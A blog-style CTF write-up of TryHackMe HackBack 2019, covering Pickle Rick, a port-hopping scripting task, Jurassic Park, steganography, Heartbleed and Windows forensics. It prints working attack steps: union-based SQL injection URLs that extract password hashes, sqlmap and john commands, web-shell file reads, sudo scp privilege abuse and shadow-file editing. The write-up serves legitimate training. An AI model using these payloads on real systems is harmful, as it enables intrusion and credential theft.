---
title: TryHackMe - HackBack 2019
layout: post
description: A write up of the TryHackMe HackBack 2019 University CTF
tags: ctf tryhackme
toc: true
---

# TryHackMe - HackBack 2019

## Task 1: Connect to our network 
Free points for connecting to the challenge network? Sweet. However our University address range conflicted with the CTF address range things were a little harder. To get around this, I used a NAT adapter on my Kali VM to put it in a 192.0.0.0/8 address range, which solved the issue.
>openvpn --config ./username.ovpn --daemon

Once connected simply submit empty answers to get the points.

## Task 2: Pickle Rick [Web Exploitation] [Easy]

### Question 1: What is the first ingredient Rick needs?

As this as an easy task I expected that the credentials or flags would be leaked somewhere on the page, rather than through any fancy exploitation. If we look at the source code of the homepage we can see a username "hidden" as a comment.

>index.html
>{:.filename}
>{% highlight html %}
>  <!--
>
>    Note to self, remember username!
>
>    Username: R1ckRul3s
>
>  -->
>{% endhighlight  %}

I next looked at the "robots.txt" file as that is a common place for information leakage. 
>robots.txt
{:.filename}
Wubbalubbadubdub

As this wasn't in the usual format of a robots.txt file, this looks like it could be a password or a flag. As it was an incorrect flag, I kept it for a potential password.

The next step was to locate a login form to use these credentials on. Continuing with the obvious, "login.php" turned out to be the correct page for this.

After login we are given a primitive web shell with limited command access. An "ls" command reveals a "Sup3rS3cretPickl3Ingred.txt" and "clue.txt" in the web directory. The first file gives us the answer to the first question.


>Sup3rS3cretPickl3Ingred.txt
{:.filename}
mr. meeseek hair

### Question 2: Whats the second ingredient Rick needs?

We got a clue fron the web directory about the location of the second ingrediant.

>clue.txt
{:.filename}
Look around the file system for the other ingredient.

My first thought was to go look at home directories, so I ran ls on /home/, which showed a "rick" user. An ls of /home/rick gave us a "second ingredients" file. Attempting to use the "cat" command gives you a "Command disabled" error. The work around I thought of for this was to use grep to match everything and print it.
>grep .* /home/rick/second\ ingredients

<!-- -->
>/home/rick/second ingredients
{:.filename}
1 jerry tear

### Question 3: Whats the final ingredient Rick needs?

As this is the last flag, I assumed it would  likely be in root. However, we don't have permissions to browse that directory yet. Originally I used perl to create a reverse shell to try and sudo as I thought a tty would be required, however it turns out we can just sudo from this web terminal. A "sudo ls" of "/root" shows us a "3rd.txt" which looks like what we are looking for.
>sudo grep .* /root/3rd.txt

<!-- -->
>/root/3rd.txt
{:.filename}
fleeb juice


## Task 3: Gotta Catch em All [Scripting] [Medium]

To complete this challenge we need to understand what it wants us to create. It tells us that we need to connect to a specified port, do an operation on a number, and move on to the next port.

It gives us the format of "operation, number, next port" for each connection. The start conditions are to start on port 1337 and the sum at 0. The finish conditions are port 9765 or if STOP is in the page response.

The operations given are "add" and "minus", however, during testing I also found "multiply" and divide.

The questions tells us to give the answer to 2 decimal places, meaning our sums should be implemented as a float rather than an integer.

The IP that this challenge is deployed on, also tells us what port is currently open on port 3010.

Due to the nature of networking, it is also important to implement catching exceptions when connections fails.

Given these conditions here is my code:

>getflag.py
>import socket
>from time import sleep
>ip="DEPLOYED IP"
>getpage="GET / HTTP/1.1\nHost:" + ip + "\n\n"
>def getopenport():
>	portstart="<a target=\"_blank\" id=\"onPort\">"
>	portend="</a>"
>	try:
>		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>		s.connect((ip, 3010))
>		s.send(getpage.encode())
>		httpdata=s.recv(1024)
>		httpdata+=s.recv(1024)
>		page=httpdata.decode()
>		s.close()
>		return int(page[page.find(portstart)+len(portstart):page.find(portend)])
>	except:
>		return 0
>
>def processline(line, current_total):
>	data=line.split()
>	total=0
>	operation=data[0]
>	value=float(data[1])
>	nextport=int(data[2])
>	if "add" in operation:
>		total=current_total+value
>	elif "minus" in operation:
>		total=current_total-value
>	elif "multiply" in operation:
>		total=current_total*value
>	elif "divide" in operation:
>		total=current_total/value
>	else:
>		print("ERROR!!!")
>		print(line)
>	return nextport, total
>
>
>lastport=0
>currentport=0
>desiredport=1337
>total=float(0)
>
>while(True):
>	currentport=getopenport()
>	if(currentport != lastport):
>		if(currentport != 0):
>			lastport=currentport
>			print("Current Port: " + str(currentport))
>	if(currentport==desiredport):
>		sleep(0.5)
>		try:
>			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>			s.connect((ip, desiredport))
>			s.send(getpage.encode())
>			httpdata=s.recv(1024)
>			httpdata+=s.recv(1024)
>			page=httpdata.decode()
>			s.close()
>			if "STOP" in page:
>				break
>			lines=page.split("\n")
>			print("Recieved: " + lines[-1])
>			desiredport, total=processline(lines[-1], total)
>			if desiredport == 9765:
>				break
>			print("Current Total: " + str(total))
>		except:
>			print("Connection failed to: " + ip + ":" + str(currentport))
>	else:
>		sleep(1)
>print("Finished the final total is:")
>print(round(total,2))






- :3010 website shows currently used port
- Wait for 1337
- Parse operation
- Continue instruction set till DONE or Port ####
- Print result

## Jursassic Park
- Looks like SQL injection from questions
- robots.txt from Pickle Rick?
- nmap shows open SSH that takes passwords
- Some fitering on id (@, -)
- Using # for comments works

### 1 - Database name and 
http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,%20null,%20DATABASE(),%20null 
- Output can be gained from the 4th or 5th column

- Use DATABASE() command

### 2 - Number of columns
- Also gives use the number of columns
- (5)

### 3 - Version of OS

- Use version() command
- http://10.0.0.56/item.php?id=1%20union%20select%20null,%20null,null%20,%20version(),%20null
- Tells us that is mysql 5.7

### 4 - dennis's password

http://10.0.0.246/item.php?id=0%20union%20select%20null,%20null,%20null,%20authentication_string,%20user%20from%20mysql.user%20LIMIT%201%20OFFSET%200%20#

- can't read /etc/passwd
- get password for mysql
john --wordlist=/usr/share/wordlists/rockyou.txt jurassic.txt

sqlmap -u http://10.0.0.246/item.php?id=1 -p id --dbms mysql 5.7 --suffix="#"

http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20table_schema%20FROM%20information_schema.tables%20WHERE%20table_schema=%22park%22%20LIMIT%201%20OFFSET%201#
users tables

http://10.0.0.132/item.php?id=0%20union%20select%20null,%20null,%20null,%20table_name,%20COLUMN_NAME%20FROM%20information_schema.columns%20WHERE%20table_name=%22users%22%20LIMIT%201%20OFFSET%202#

usernames, password

usernames filtered so

http://10.0.0.132/item.php?id=0%20union%20select%20*,%20null,%20null%20FROM%20users%20%20LIMIT%201%20OFFSET%200#

ssh access

love the sqlmap trolling

look at .bash_history
Flag 3
notice sudo us
sudo -l show scp nopasswd
sudo scp /root/flag5.txt dennis@10.0.0.132:~/

notice hint in web directory
cannot use mysql vuln so just reverse shell then esc

reverse shell to msf
local exploit suggestor

...
- ubuntu directory
- boot grub
- bash histroy of dennis

- root

scp can do local copy too
I am dumb
edit shadow file to same password as dennis and su

Flag 4 is in /tmp according to .viminfo but no sign of it

## Base 64
- Open in python
- Decode 50 times
- Print result

## Steganography

### Flag 1
Exif tool on Lenna

### Flag 2
Foremost to extract zip from Lenna
password was first flag's hex value
flag2.mp3 is a computer saying flag 2 is steganographyrules with no spaces

### Flag 3

Ran strings on "Stéphane.png" ( the longer one), flag is appended to the end of the file

### Flag 4
flag4 is a binary
ran strings on it
Saw "Nothing to see here.." followed by a base64 string
Got "stegosaurus" as the flag when decoded

### Flag 5

https://29a.ch/photo-forensics/#noise-analysis
Showed ascii characters in noise
Decoded to flag in hex
Also very visable in blue lsb

### Flag 6
Spent loads of time on this
"Intepreted outside the box" to being in the original file not the zip.
Saw some barcode like structure on the edge of the photo
Spent ages trying to decode it

Found original to have same barcode structure

On a whim downloaded the image next to the download button because that's outside of the box too
Ran exif tool 
flag 6

## Protecting Data In Transit

Vm is named heartbleed
Lots of heartbleed references
msf
scanner/ssl/openssl_heartbleed
Run till something that looks like a flag, guessed THM{} from previous challenges

## Investigating Windows
### Question 1
net localgroup Administrators
### Question 2
Look at task schduler
"Clean file system runs malicious netcat"

### Question 3
Task was created on 3/2/2019 - meaning it was compromised then

### Question 4
Windows Firewalls with Advanced Security
Inbound roles
Port 1337, "Aloow outside connections for developmnet"
Sounds fishy to me, correct answer
Correct way: Applications and services, Microsoft, Windows, Windows Firewall with Advanced Security
Gives same rule name


Event log: 
### Question 5
hosts file was in recent files
Show www.google resolving to a weird address as well as local host for virus services


### Question 6
Compromise begins at 3/2/2019 4:39:09 - powershell netcat is ran can see in powershell event log 
Event ID 4672